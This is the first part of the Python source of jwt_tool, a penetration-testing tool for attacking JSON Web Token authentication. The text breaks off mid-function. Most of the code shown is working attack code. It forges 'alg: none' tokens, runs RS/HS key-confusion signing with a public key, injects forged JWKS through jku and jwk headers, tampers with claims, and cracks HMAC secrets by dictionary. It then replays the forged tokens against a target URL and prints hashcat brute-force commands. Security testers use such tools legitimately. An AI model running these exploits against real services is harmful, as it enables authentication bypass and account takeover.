#!/usr/bin/env python3
#
# JWT_Tool version 2.2.6 (09_09_2022)
# Written by Andy Tyler (@ticarpi)
# Please use responsibly...
# Software URL: https://github.com/ticarpi/jwt_tool
# Web: https://www.ticarpi.com
# Twitter: @ticarpi

jwttoolvers = "2.2.6"
import ssl
import sys
import os
import re
import hashlib
import hmac
import base64
import json
import random
import argparse
from datetime import datetime
import configparser
from http.cookies import SimpleCookie
from collections import OrderedDict
try:
    from Cryptodome.Signature import PKCS1_v1_5, DSS, pss
    from Cryptodome.Hash import SHA256, SHA384, SHA512
    from Cryptodome.PublicKey import RSA, ECC
except:
    print("WARNING: Cryptodome libraries not imported - these are needed for asymmetric crypto signing and verifying")
    print("On most Linux systems you can run the following command to install:")
    print("python3 -m pip install pycryptodomex\n")
    exit(1)
try:
    from termcolor import cprint
except:
    print("WARNING: termcolor library is not imported - this is used to make the output clearer and oh so pretty")
    print("On most Linux systems you can run the following command to install:")
    print("python3 -m pip install termcolor\n")
    exit(1)
try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except:
    print("WARNING: Python Requests libraries not imported - these are needed for external service interaction")
    print("On most Linux systems you can run the following command to install:")
    print("python3 -m pip install requests\n")
    exit(1)
# To fix broken colours in Windows cmd/Powershell: uncomment the below two lines. You will need to install colorama: 'python3 -m pip install colorama'
# import colorama
# colorama.init()

def cprintc(textval, colval):
    if not args.bare:
        cprint(textval, colval)

def b64pad(buf):
    """ Restore stripped B64 padding """
    return buf + '=' * (4 - len(buf) % 4 if len(buf) % 4 in (2, 3) else 0)

def createConfig():
    privKeyName = path+"/jwttool_custom_private_RSA.pem"
    pubkeyName = path+"/jwttool_custom_public_RSA.pem"
    ecprivKeyName = path+"/jwttool_custom_private_EC.pem"
    ecpubkeyName = path+"/jwttool_custom_public_EC.pem"
    jwksName = path+"/jwttool_custom_jwks.json"
    proxyHost = "127.0.0.1"
    config = configparser.ConfigParser(allow_no_value=True)
    config.optionxform = str
    config['crypto'] = {'pubkey': pubkeyName,
        'privkey': privKeyName,
        'ecpubkey': ecpubkeyName,
        'ecprivkey': ecprivKeyName,
        'jwks': jwksName}
    config['customising'] = {'useragent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) jwt_tool',
        'jwks_kid': 'jwt_tool'}
    if (os.path.isfile(privKeyName)) and (os.path.isfile(pubkeyName)) and (os.path.isfile(ecprivKeyName)) and (os.path.isfile(ecpubkeyName)) and (os.path.isfile(jwksName)):
        cprintc("Found existing Public and Private Keys - using these...", "cyan")
        origjwks = open(jwksName, "r").read()
        jwks_b64 = base64.b64encode(origjwks.encode('ascii'))
    else:
        # gen RSA keypair
        pubKey, privKey = newRSAKeyPair()
        with open(privKeyName, 'w') as test_priv_out:
            test_priv_out.write(privKey.decode())
        with open(pubkeyName, 'w') as test_pub_out:
            test_pub_out.write(pubKey.decode())
        # gen EC keypair
        ecpubKey, ecprivKey = newECKeyPair()
        with open(ecprivKeyName, 'w') as ectest_priv_out:
            ectest_priv_out.write(ecprivKey)
        with open(ecpubkeyName, 'w') as ectest_pub_out:
            ectest_pub_out.write(ecpubKey)
        # gen jwks
        new_key = RSA.importKey(pubKey)
        n = base64.urlsafe_b64encode(new_key.n.to_bytes(256, byteorder='big'))
        e = base64.urlsafe_b64encode(new_key.e.to_bytes(3, byteorder='big'))
        jwksbuild = buildJWKS(n, e, "jwt_tool")
        jwksout = {"keys": []}
        jwksout["keys"].append(jwksbuild)
        fulljwks = json.dumps(jwksout,separators=(",",":"), indent=4)
        with open(jwksName, 'w') as test_jwks_out:
                test_jwks_out.write(fulljwks)
        jwks_b64 = base64.urlsafe_b64encode(fulljwks.encode('ascii'))
    config['services'] = {'jwt_tool_version': jwttoolvers,
        '# To disable the proxy option set this value to: False (no quotes). For Docker installations with a Windows host OS set this to: "host.docker.internal:8080"': None, 'proxy': proxyHost+':8080',
        '# To disable following redirects set this value to: False (no quotes)': None, 'redir': 'True',
        '# Set this to the URL you are hosting your custom JWKS file (jwttool_custom_jwks.json) - your own server, or maybe use this cheeky reflective URL (https://httpbin.org/base64/{base64-encoded_JWKS_here})': None,
        'jwksloc': '',
        'jwksdynamic': 'https://httpbin.org/base64/'+jwks_b64.decode(),
        '# Set this to the base URL of a Collaborator server, somewhere you can read live logs, a Request Bin etc.': None, 'httplistener': ''}
    config['input'] = {'wordlist': 'jwt-common.txt',
        'commonHeaders': 'common-headers.txt',
        'commonPayloads': 'common-payloads.txt'}
    config['argvals'] = {'# Set at runtime - changes here are ignored': None,
        'sigType': '',
        'targetUrl': '',
        'cookies': '',
        'key': '',
        'keyList': '',
        'keyFile': '',
        'headerLoc': '',
        'payloadclaim': '',
        'headerclaim': '',
        'payloadvalue': '',
        'headervalue': '',
        'canaryvalue': '',
        'header': '',
        'exploitType': '',
        'scanMode': '',
        'reqMode': '',
        'postData': '',
        'resCode': '',
        'resSize': '',
        'resContent': ''}
    with open(configFileName, 'w') as configfile:
        config.write(configfile)
    cprintc("Configuration file built - review contents of \"jwtconf.ini\" to customise your options.", "cyan")
    cprintc("Make sure to set the \"httplistener\" value to a URL you can monitor to enable out-of-band checks.", "cyan")
    exit(1)

def sendToken(token, cookiedict, track, headertoken="", postdata=None):
    if not postdata:
        postdata = config['argvals']['postData']
    url = config['argvals']['targetUrl']
    headers = {'User-agent': config['customising']['useragent']+" "+track}
    if headertoken:
        for eachHeader in headertoken:
            headerName, headerVal = eachHeader.split(":",1)
            headers[headerName] = headerVal.lstrip(" ")
    try:
        if config['services']['redir'] == "True":
            redirBool = True
        else:
            redirBool = False
        if config['services']['proxy'] == "False":
            if postdata:
                response = requests.post(url, data=postdata, headers=headers, cookies=cookiedict, proxies=False, verify=False, allow_redirects=redirBool)
            else:
                response = requests.get(url, headers=headers, cookies=cookiedict, proxies=False, verify=False, allow_redirects=redirBool)
        else:
            proxies = {'http': 'http://'+config['services']['proxy'], 'https': 'http://'+config['services']['proxy']}
            if postdata:
                response = requests.post(url, data=postdata, headers=headers, cookies=cookiedict, proxies=proxies, verify=False, allow_redirects=redirBool)
            else:
                response = requests.get(url, headers=headers, cookies=cookiedict, proxies=proxies, verify=False, allow_redirects=redirBool)
        if int(response.elapsed.total_seconds()) >= 9:
            cprintc("HTTP response took about 10 seconds or more - could be a sign of a bug or vulnerability", "cyan")
        return [response.status_code, len(response.content), response.content]
    except requests.exceptions.ProxyError as err:
        cprintc("[ERROR] ProxyError - check proxy is up and not set to tamper with requests\n"+str(err), "red")
        exit(1)

def parse_dict_cookies(value):
    cookiedict = {}
    for item in value.split(';'):
        item = item.strip()
        if not item:
            continue
        if '=' not in item:
            cookiedict[item] = None
            continue
        name, value = item.split('=', 1)
        cookiedict[name] = value
    return cookiedict

def strip_dict_cookies(value):
    cookiestring = ""
    for item in value.split(';'):
        if re.search('eyJ[A-Za-z0-9_\/+-]*\.eyJ[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*', item):
            continue
        else:
            cookiestring += "; "+item
        cookiestring = cookiestring.lstrip("; ")
    return cookiestring

def jwtOut(token, fromMod, desc=""):
    genTime = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    idFrag = genTime+str(token)
    logID = "jwttool_"+hashlib.md5(idFrag.encode()).hexdigest()
    if config['argvals']['targetUrl'] != "":
        curTargetUrl = config['argvals']['targetUrl']
        p = re.compile('eyJ[A-Za-z0-9_\/+-]*\.eyJ[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*')

        if config['argvals']['headerloc'] == "cookies":
            cookietoken = p.subn(token, config['argvals']['cookies'], 0)
        else:
            cookietoken = [config['argvals']['cookies'],0]

        if config['argvals']['headerloc'] == "headers":
            headertoken = [[],0]
            for eachHeader in args.headers:
                try:
                    headerSub = p.subn(token, eachHeader, 0)
                    headertoken[0].append(headerSub[0])
                    if headerSub[1] == 1:
                        headertoken[1] = 1
                except:
                    pass
        else:
            headertoken = [[],0]
            if args.headers:
                for eachHeader in args.headers:
                        headertoken[0].append(eachHeader)

        if config['argvals']['headerloc'] == "postdata":
            posttoken = p.subn(token, config['argvals']['postdata'], 0)
        else:
            posttoken = [config['argvals']['postdata'],0]


        try:
            cookiedict = parse_dict_cookies(cookietoken[0])
        except:
            cookiedict = {}



        # Check if token was included in substitution
        if cookietoken[1] == 1 or headertoken[1] == 1 or posttoken[1]:
            resData = sendToken(token, cookiedict, logID, headertoken[0], posttoken[0])
        else:
            if config['argvals']['overridesub'] == "true":
                resData = sendToken(token, cookiedict, logID, headertoken[0], posttoken[0])
            else:
                cprintc("[-] No substitution occurred - check that a token is included in a cookie/header in the request", "red")
                # cprintc(headertoken, cookietoken, "cyan")
                exit(1)
        if config['argvals']['canaryvalue']:
            if config['argvals']['canaryvalue'] in str(resData[2]):
                cprintc("[+] FOUND \""+config['argvals']['canaryvalue']+"\" in response:\n"+logID + " " + fromMod + " Response Code: " + str(resData[0]) + ", " + str(resData[1]) + " bytes", "green")
            else:
                cprintc(logID + " " + fromMod + " Response Code: " + str(resData[0]) + ", " + str(resData[1]) + " bytes", "cyan")
        else:
            if 200 <= resData[0] < 300:
                cprintc(logID + " " + fromMod + " Response Code: " + str(resData[0]) + ", " + str(resData[1]) + " bytes", "green")
            elif 300 <= resData[0] < 400:
                cprintc(logID + " " + fromMod + " Response Code: " + str(resData[0]) + ", " + str(resData[1]) + " bytes", "cyan")
            elif 400 <= resData[0] < 600:
                cprintc(logID + " " + fromMod + " Response Code: " + str(resData[0]) + ", " + str(resData[1]) + " bytes", "red")
    else:
        if desc != "":
            cprintc(logID+" - "+desc, "cyan")
        if not args.bare:
            cprintc("[+] "+token, "green")
        else:
            print(token)
        curTargetUrl = "Not sent"
    additional = "[Commandline request: "+' '.join(sys.argv[0:])+']'
    setLog(token, genTime, logID, fromMod, curTargetUrl, additional)
    try:
        config['argvals']['rescode'],config['argvals']['ressize'],config['argvals']['rescontent'] = str(resData[0]),str(resData[1]),str(resData[2])
    except:
        pass

def setLog(jwt, genTime, logID, modulename, targetURL, additional):
    logLine = genTime+" | "+modulename+" | "+targetURL+" | "+additional
    with open(logFilename, 'a') as logFile:
        logFile.write(logID+" - "+logLine+" - "+jwt+"\n")
    return logID

def buildHead(alg, headDict):
    newHead = headDict
    newHead["alg"] = alg
    newHead = base64.urlsafe_b64encode(json.dumps(newHead,separators=(",",":")).encode()).decode('UTF-8').strip("=")
    return newHead

def checkNullSig(contents):
    jwtNull = contents.decode()+"."
    return jwtNull

def checkAlgNone(headDict, paylB64):
    alg1 = "none"
    newHead1 = buildHead(alg1, headDict)
    CVEToken0 = newHead1+"."+paylB64+"."
    alg = "None"
    newHead = buildHead(alg, headDict)
    CVEToken1 = newHead+"."+paylB64+"."
    alg = "NONE"
    newHead = buildHead(alg, headDict)
    CVEToken2 = newHead+"."+paylB64+"."
    alg = "nOnE"
    newHead = buildHead(alg, headDict)
    CVEToken3 = newHead+"."+paylB64+"."
    return [CVEToken0, CVEToken1, CVEToken2, CVEToken3]

def checkPubKeyExploit(headDict, paylB64, pubKey):
    try:
        key = open(pubKey).read()
        cprintc("File loaded: "+pubKey, "cyan")
    except:
        cprintc("[-] File not found", "red")
        exit(1)
    newHead = headDict
    newHead["alg"] = "HS256"
    newHead = base64.urlsafe_b64encode(json.dumps(headDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
    newTok = newHead+"."+paylB64
    newSig = base64.urlsafe_b64encode(hmac.new(key.encode(),newTok.encode(),hashlib.sha256).digest()).decode('UTF-8').strip("=")
    return newTok, newSig

def injectpayloadclaim(payloadclaim, injectionvalue):
    newpaylDict = paylDict
    newpaylDict[payloadclaim] = castInput(injectionvalue)
    newPaylB64 = base64.urlsafe_b64encode(json.dumps(newpaylDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
    return newpaylDict, newPaylB64

def injectheaderclaim(headerclaim, injectionvalue):
    newheadDict = headDict
    newheadDict[headerclaim] = castInput(injectionvalue)
    newHeadB64 = base64.urlsafe_b64encode(json.dumps(newheadDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
    return newheadDict, newHeadB64

def tamperToken(paylDict, headDict, sig):
    cprintc("\n====================================================================\nThis option allows you to tamper with the header, contents and \nsignature of the JWT.\n====================================================================", "white")
    cprintc("\nToken header values:", "white")
    while True:
        i = 0
        headList = [0]
        for pair in headDict:
            menuNum = i+1
            if isinstance(headDict[pair], dict):
                cprintc("["+str(menuNum)+"] "+pair+" = JSON object:", "green")
                for subclaim in headDict[pair]:
                    cprintc("    [+] "+subclaim+" = "+str(headDict[pair][subclaim]), "green")
            else:
                if type(headDict[pair]) == str:
                    cprintc("["+str(menuNum)+"] "+pair+" = \""+str(headDict[pair])+"\"", "green")
                else:
                    cprintc("["+str(menuNum)+"] "+pair+" = "+str(headDict[pair]), "green")
            headList.append(pair)
            i += 1
        cprintc("["+str(i+1)+"] *ADD A VALUE*", "white")
        cprintc("["+str(i+2)+"] *DELETE A VALUE*", "white")
        cprintc("[0] Continue to next step", "white")
        selection = ""
        cprintc("\nPlease select a field number:\n(or 0 to Continue)", "white")
        try:
            selection = int(input("> "))
        except:
            cprintc("Invalid selection", "red")
            exit(1)
        if selection<len(headList) and selection>0:
            if isinstance(headDict[headList[selection]], dict):
                cprintc("\nPlease select a sub-field number for the "+pair+" claim:\n(or 0 to Continue)", "white")
                newVal = OrderedDict()
                for subclaim in headDict[headList[selection]]:
                    newVal[subclaim] = headDict[pair][subclaim]
                newVal = buildSubclaim(newVal, headList, selection)
                headDict[headList[selection]] = newVal
            else:
                cprintc("\nCurrent value of "+headList[selection]+" is: "+str(headDict[headList[selection]]), "white")
                cprintc("Please enter new value and hit ENTER", "white")
                newVal = input("> ")
            headDict[headList[selection]] = castInput(newVal)
        elif selection == i+1:
            cprintc("Please enter new Key and hit ENTER", "white")
            newPair = input("> ")
            cprintc("Please enter new value for "+newPair+" and hit ENTER", "white")
            newInput = input("> ")
            headList.append(newPair)
            headDict[headList[selection]] = castInput(newInput)
        elif selection == i+2:
            cprintc("Please select a Key to DELETE and hit ENTER", "white")
            i = 0
            for pair in headDict:
                menuNum = i+1
                cprintc("["+str(menuNum)+"] "+pair+" = "+str(headDict[pair]), "white")
                headList.append(pair)
                i += 1
            try:
                delPair = int(input("> "))
            except:
                cprintc("Invalid selection", "red")
                exit(1)
            del headDict[headList[delPair]]
        elif selection == 0:
            break
        else:
            exit(1)
    cprintc("\nToken payload values:", "white")
    while True:
        comparestamps, expiredtoken = dissectPayl(paylDict, count=True)
        i = 0
        paylList = [0]
        for pair in paylDict:
            menuNum = i+1
            paylList.append(pair)
            i += 1
        cprintc("["+str(i+1)+"] *ADD A VALUE*", "white")
        cprintc("["+str(i+2)+"] *DELETE A VALUE*", "white")
        if len(comparestamps) > 0:
            cprintc("["+str(i+3)+"] *UPDATE TIMESTAMPS*", "white")
        cprintc("[0] Continue to next step", "white")
        selection = ""
        cprintc("\nPlease select a field number:\n(or 0 to Continue)", "white")
        try:
            selection = int(input("> "))
        except:
            cprintc("Invalid selection", "red")
            exit(1)
        if selection<len(paylList) and selection>0:
            if isinstance(paylDict[paylList[selection]], dict):
                cprintc("\nPlease select a sub-field number for the "+str(paylList[selection])+" claim:\n(or 0 to Continue)", "white")
                newVal = OrderedDict()
                for subclaim in paylDict[paylList[selection]]:
                    newVal[subclaim] = paylDict[paylList[selection]][subclaim]
                newVal = buildSubclaim(newVal, paylList, selection)
                paylDict[paylList[selection]] = newVal
            else:
                cprintc("\nCurrent value of "+paylList[selection]+" is: "+str(paylDict[paylList[selection]]), "white")
                cprintc("Please enter new value and hit ENTER", "white")
                newVal = input("> ")
                paylDict[paylList[selection]] = castInput(newVal)
        elif selection == i+1:
            cprintc("Please enter new Key and hit ENTER", "white")
            newPair = input("> ")
            cprintc("Please enter new value for "+newPair+" and hit ENTER", "white")
            newVal = input("> ")
            try:
                newVal = int(newVal)
            except:
                pass
            paylList.append(newPair)
            paylDict[paylList[selection]] = castInput(newVal)
        elif selection == i+2:
            cprintc("Please select a Key to DELETE and hit ENTER", "white")
            i = 0
            for pair in paylDict:
                menuNum = i+1
                cprintc("["+str(menuNum)+"] "+pair+" = "+str(paylDict[pair]), "white")
                paylList.append(pair)
                i += 1
            delPair = eval(input("> "))
            del paylDict[paylList[delPair]]
        elif selection == i+3:
            cprintc("Timestamp updating:", "white")
            cprintc("[1] Update earliest timestamp to current time (keeping offsets)", "white")
            cprintc("[2] Add 1 hour to timestamps", "white")
            cprintc("[3] Add 1 day to timestamps", "white")
            cprintc("[4] Remove 1 hour from timestamps", "white")
            cprintc("[5] Remove 1 day from timestamps", "white")
            cprintc("\nPlease select an option from above (1-5):", "white")
            try:
                selection = int(input("> "))
            except:
                cprintc("Invalid selection", "red")
                exit(1)
            if selection == 1:
                nowtime = int(datetime.now().timestamp())
                timecomp = {}
                for timestamp in comparestamps:
                    timecomp[timestamp] = paylDict[timestamp]
                earliest = min(timecomp, key=timecomp.get)
                earlytime = paylDict[earliest]
                for timestamp in comparestamps:
                    if timestamp == earliest:
                        paylDict[timestamp] = nowtime
                    else:
                        difftime = int(paylDict[timestamp])-int(earlytime)
                        paylDict[timestamp] = nowtime+difftime
            elif selection == 2:
                for timestamp in comparestamps:
                    newVal = int(paylDict[timestamp])+3600
                    paylDict[timestamp] = newVal
            elif selection == 3:
                for timestamp in comparestamps:
                    newVal = int(paylDict[timestamp])+86400
                    paylDict[timestamp] = newVal
            elif selection == 4:
                for timestamp in comparestamps:
                    newVal = int(paylDict[timestamp])-3600
                    paylDict[timestamp] = newVal
            elif selection == 5:
                for timestamp in comparestamps:
                    newVal = int(paylDict[timestamp])-86400
                    paylDict[timestamp] = newVal
            else:
                cprintc("Invalid selection", "red")
                exit(1)
        elif selection == 0:
            break
        else:
            exit(1)
    if config['argvals']['sigType'] == "" and config['argvals']['exploitType'] == "":
        cprintc("Signature unchanged - no signing method specified (-S or -X)", "cyan")
        newContents = genContents(headDict, paylDict)
        desc = "Tampered token:"
        jwtOut(newContents+"."+sig, "Manual Tamper - original signature", desc)
    elif config['argvals']['exploitType'] != "":
        runExploits()
    elif config['argvals']['sigType'] != "":
        signingToken(headDict, paylDict)

def signingToken(newheadDict, newpaylDict):
    if config['argvals']['sigType'][0:2] == "hs":
        key = ""
        if args.password:
            key = config['argvals']['key']
        elif args.keyfile:
            key = open(config['argvals']['keyFile']).read()
        newSig, newContents = signTokenHS(newheadDict, newpaylDict, key, int(config['argvals']['sigType'][2:]))
        desc = "Tampered token - HMAC Signing:"
        jwtOut(newContents+"."+newSig, "Manual Tamper - HMAC Signing", desc)
    elif config['argvals']['sigType'][0:2] == "rs":
        newSig, newContents = signTokenRSA(newheadDict, newpaylDict, config['crypto']['privkey'], int(config['argvals']['sigType'][2:]))
        desc = "Tampered token - RSA Signing:"
        jwtOut(newContents+"."+newSig, "Manual Tamper - RSA Signing", desc)
    elif config['argvals']['sigType'][0:2] == "es":
        newSig, newContents = signTokenEC(newheadDict, newpaylDict, config['crypto']['ecprivkey'], int(config['argvals']['sigType'][2:]))
        desc = "Tampered token - EC Signing:"
        jwtOut(newContents+"."+newSig, "Manual Tamper - EC Signing", desc)
    elif config['argvals']['sigType'][0:2] == "ps":
        newSig, newContents = signTokenPSS(newheadDict, newpaylDict, config['crypto']['privkey'], int(config['argvals']['sigType'][2:]))
        desc = "Tampered token - PSS RSA Signing:"
        jwtOut(newContents+"."+newSig, "Manual Tamper - PSS RSA Signing", desc)

def checkSig(sig, contents, key):
    quiet = False
    if key == "":
        cprintc("Type in the key to test", "white")
        key = input("> ")
    testKey(key.encode(), sig, contents, headDict, quiet)

def checkSigKid(sig, contents):
    quiet = False
    cprintc("\nLoading key file...", "cyan")
    try:
        key1 = open(config['argvals']['keyFile']).read()
        cprintc("File loaded: "+config['argvals']['keyFile'], "cyan")
        testKey(key1.encode(), sig, contents, headDict, quiet)
    except:
        cprintc("Could not load key file", "red")
        exit(1)

def crackSig(sig, contents):
    quiet = True
    if headDict["alg"][0:2] != "HS":
        cprintc("Algorithm is not HMAC-SHA - cannot test against passwords, try the Verify function.", "red")
        return
    # print("\nLoading key dictionary...")
    try:
        # cprintc("File loaded: "+config['argvals']['keyList'], "cyan")
        keyLst = open(config['argvals']['keyList'], "r", encoding='utf-8', errors='ignore')
        nextKey = keyLst.readline()
    except:
        cprintc("No dictionary file loaded", "red")
        exit(1)
    # print("Testing passwords in dictionary...")
    utf8errors = 0
    wordcount = 0
    while nextKey:
        wordcount += 1
        try:
            cracked = testKey(nextKey.strip().encode('UTF-8'), sig, contents, headDict, quiet)
        except:
            cracked = False
        if not cracked:
            if wordcount % 1000000 == 0:
                cprintc("[*] Tested "+str(int(wordcount/1000000))+" million passwords so far", "cyan")
            try:
                nextKey = keyLst.readline()
            except:
                utf8errors  += 1
                nextKey = keyLst.readline()
        else:
            return
    if cracked == False:
        cprintc("[-] Key not in dictionary", "red")
        if not args.mode:
            cprintc("\n===============================\nAs your list wasn't able to crack this token you might be better off using longer dictionaries, custom dictionaries, mangling rules, or brute force attacks.\nhashcat (https://hashcat.net/hashcat/) is ideal for this as it is highly optimised for speed. Just add your JWT to a text file, then use the following syntax to give you a good start:\n\n[*] dictionary attacks: hashcat -a 0 -m 16500 jwt.txt passlist.txt\n[*] rule-based attack:  hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule\n[*] brute-force attack: hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6\n===============================\n", "cyan")
    if utf8errors > 0:
        cprintc(utf8errors, " UTF-8 incompatible passwords skipped", "cyan")

def castInput(newInput):
    if "{" in str(newInput):
        try:
            jsonInput = json.loads(newInput)
            return jsonInput
        except ValueError:
            pass
    if "\"" in str(newInput):
        return newInput.strip("\"")
    elif newInput == "True" or newInput == "true":
        return True
    elif newInput == "False" or newInput == "false":
        return False
    elif newInput == "null":
        return None
    else:
        try:
            numInput = float(newInput)
            try:
                intInput = int(newInput)
                return intInput
            except:
                return numInput
        except:
            return str(newInput)
    return newInput

def buildSubclaim(newVal, claimList, selection):
    while True:
        subList = [0]
        s = 0
        for subclaim in newVal:
            subNum = s+1
            cprintc("["+str(subNum)+"] "+subclaim+" = "+str(newVal[subclaim]), "white")
            s += 1
            subList.append(subclaim)
        cprintc("["+str(s+1)+"] *ADD A VALUE*", "white")
        cprintc("["+str(s+2)+"] *DELETE A VALUE*", "white")
        cprintc("[0] Continue to next step", "white")
        try:
            subSel = int(input("> "))
        except:
            cprintc("Invalid selection", "red")
            exit(1)
        if subSel<=len(newVal) and subSel>0:
            selClaim = subList[subSel]
            cprintc("\nCurrent value of "+selClaim+" is: "+str(newVal[selClaim]), "white")
            cprintc("Please enter new value and hit ENTER", "white")
            newVal[selClaim] = castInput(input("> "))
            cprintc("", "white")
        elif subSel == s+1:
            cprintc("Please enter new Key and hit ENTER", "white")
            newPair = input("> ")
            cprintc("Please enter new value for "+newPair+" and hit ENTER", "white")
            newVal[newPair] = castInput(input("> "))
        elif subSel == s+2:
            cprintc("Please select a Key to DELETE and hit ENTER", "white")
            s = 0
            for subclaim in newVal:
                subNum = s+1
                cprintc("["+str(subNum)+"] "+subclaim+" = "+str(newVal[subclaim]), "white")
                subList.append(subclaim)
                s += 1
            try:
                selSub = int(input("> "))
            except:
                cprintc("Invalid selection", "red")
                exit(1)
            delSub = subList[selSub]
            del newVal[delSub]
        elif subSel == 0:
            return newVal

def testKey(key, sig, contents, headDict, quiet):
    if headDict["alg"] == "HS256":
        testSig = base64.urlsafe_b64encode(hmac.new(key,contents,hashlib.sha256).digest()).decode('UTF-8').strip("=")
    elif headDict["alg"] == "HS384":
        testSig = base64.urlsafe_b64encode(hmac.new(key,contents,hashlib.sha384).digest()).decode('UTF-8').strip("=")
    elif headDict["alg"] == "HS512":
        testSig = base64.urlsafe_b64encode(hmac.new(key,contents,hashlib.sha512).digest()).decode('UTF-8').strip("=")
    else:
        cprintc("Algorithm is not HMAC-SHA - cannot test with this tool.", "red")
        exit(1)
    if testSig == sig:
        cracked = True
        if len(key) > 25:
            cprintc("[+] CORRECT key found:\n"+key.decode('UTF-8'), "green")
        else:
            cprintc("[+] "+key.decode('UTF-8')+" is the CORRECT key!", "green")
        cprintc("You can tamper/fuzz the token contents (-T/-I) and sign it using:\npython3 jwt_tool.py [options here] -S "+str(headDict["alg"]).lower()+" -p \""+key.decode('UTF-8')+"\"", "cyan")
        return cracked
    else:
        cracked = False
        if quiet == False:
            if len(key) > 25:
                cprintc("[-] "+key[0:25].decode('UTF-8')+"...(output trimmed) is not the correct key", "red")
            else:
                cprintc("[-] "+key.decode('UTF-8')+" is not the correct key", "red")
        return cracked

def getRSAKeyPair():
    #config['crypto']['pubkey'] = config['crypto']['pubkey']
    privkey = config['crypto']['privkey']
    cprintc("key: "+privkey, "cyan")
    privKey = RSA.importKey(open(privkey).read())
    pubKey = privKey.publickey().exportKey("PEM")
    #config['crypto']['pubkey'] = RSA.importKey(config['crypto']['pubkey'])
    return pubKey, privKey

def newRSAKeyPair():
    new_key = RSA.generate(2048, e=65537)
    pubKey = new_key.publickey().exportKey("PEM")
    privKey = new_key.exportKey("PEM")
    return pubKey, privKey

def newECKeyPair():
    new_key = ECC.generate(curve='P-256')
    pubkey = new_key.public_key().export_key(format="PEM")
    privKey = new_key.export_key(format="PEM")
    return pubkey, privKey

def signTokenHS(headDict, paylDict, key, hashLength):
    newHead = headDict
    newHead["alg"] = "HS"+str(hashLength)
    if hashLength == 384:
        newContents = genContents(newHead, paylDict)
        newSig = base64.urlsafe_b64encode(hmac.new(key.encode(),newContents.encode(),hashlib.sha384).digest()).decode('UTF-8').strip("=")
    elif hashLength == 512:
        newContents = genContents(newHead, paylDict)
        newSig = base64.urlsafe_b64encode(hmac.new(key.encode(),newContents.encode(),hashlib.sha512).digest()).decode('UTF-8').strip("=")
    else:
        newContents = genContents(newHead, paylDict)
        newSig = base64.urlsafe_b64encode(hmac.new(key.encode(),newContents.encode(),hashlib.sha256).digest()).decode('UTF-8').strip("=")
    return newSig, newContents

def buildJWKS(n, e, kid):
    newjwks = {}
    newjwks["kty"] = "RSA"
    newjwks["kid"] = kid
    newjwks["use"] = "sig"
    newjwks["e"] = str(e.decode('UTF-8'))
    newjwks["n"] = str(n.decode('UTF-8').rstrip("="))
    return newjwks

def jwksGen(headDict, paylDict, jku, privKey, kid="jwt_tool"):
    newHead = headDict
    nowtime = str(int(datetime.now().timestamp()))
    key = RSA.importKey(open(config['crypto']['privkey']).read())
    pubKey = key.publickey().exportKey("PEM")
    privKey = key.export_key(format="PEM")
    new_key = RSA.importKey(pubKey)
    n = base64.urlsafe_b64encode(new_key.n.to_bytes(256, byteorder='big'))
    e = base64.urlsafe_b64encode(new_key.e.to_bytes(3, byteorder='big'))
    privKeyName = config['crypto']['privkey']
    newjwks = buildJWKS(n, e, kid)
    newHead["jku"] = jku
    newHead["alg"] = "RS256"
    key = RSA.importKey(privKey)
    newContents = genContents(newHead, paylDict)
    newContents = newContents.encode('UTF-8')
    h = SHA256.new(newContents)
    signer = PKCS1_v1_5.new(key)
    try:
        signature = signer.sign(h)
    except:
        cprintc("Invalid Private Key", "red")
        exit(1)
    newSig = base64.urlsafe_b64encode(signature).decode('UTF-8').strip("=")
    jwksout = json.dumps(newjwks,separators=(",",":"), indent=4)
    jwksbuild = {"keys": []}
    jwksbuild["keys"].append(newjwks)
    fulljwks = json.dumps(jwksbuild,separators=(",",":"), indent=4)
    if config['crypto']['jwks'] == "":
        jwksName = "jwks_jwttool_RSA_"+nowtime+".json"
        with open(jwksName, 'w') as test_jwks_out:
                test_jwks_out.write(fulljwks)
    else:
        jwksName = config['crypto']['jwks']
    return newSig, newContents.decode('UTF-8'), jwksout, privKeyName, jwksName, fulljwks

def jwksEmbed(newheadDict, newpaylDict):
    newHead = newheadDict
    pubKey, privKey = getRSAKeyPair()
    new_key = RSA.importKey(pubKey)
    n = base64.urlsafe_b64encode(new_key.n.to_bytes(256, byteorder='big'))
    e = base64.urlsafe_b64encode(new_key.e.to_bytes(3, byteorder='big'))
    newjwks = buildJWKS(n, e, config['customising']['jwks_kid'])
    newHead["jwk"] = newjwks
    newHead["alg"] = "RS256"
    key = privKey
    # key = RSA.importKey(privKey)
    newContents = genContents(newHead, newpaylDict)
    newContents = newContents.encode('UTF-8')
    h = SHA256.new(newContents)
    signer = PKCS1_v1_5.new(key)
    try:
        signature = signer.sign(h)
    except:
        cprintc("Invalid Private Key", "red")
        exit(1)
    newSig = base64.urlsafe_b64encode(signature).decode('UTF-8').strip("=")
    return newSig, newContents.decode('UTF-8')

def signTokenRSA(headDict, paylDict, privKey, hashLength):
    newHead = headDict
    newHead["alg"] = "RS"+str(hashLength)
    key = RSA.importKey(open(config['crypto']['privkey']).read())
    newContents = genContents(newHead, paylDict)
    newContents = newContents.encode('UTF-8')
    if hashLength == 256:
        h = SHA256.new(newContents)
    elif hashLength == 384:
        h = SHA384.new(newContents)
    elif hashLength == 512:
        h = SHA512.new(newContents)
    else:
        cprintc("Invalid RSA hash length", "red")
        exit(1)
    signer = PKCS1_v1_5.new(key)
    try:
        signature = signer.sign(h)
    except:
        cprintc("Invalid Private Key", "red")
        exit(1)
    newSig = base64.urlsafe_b64encode(signature).decode('UTF-8').strip("=")
    return newSig, newContents.decode('UTF-8')

def signTokenEC(headDict, paylDict, privKey, hashLength):
    newHead = headDict
    newHead["alg"] = "ES"+str(hashLength)
    key = ECC.import_key(open(config['crypto']['ecprivkey']).read())
    newContents = genContents(newHead, paylDict)
    newContents = newContents.encode('UTF-8')
    if hashLength == 256:
        h = SHA256.new(newContents)
    elif hashLength == 384:
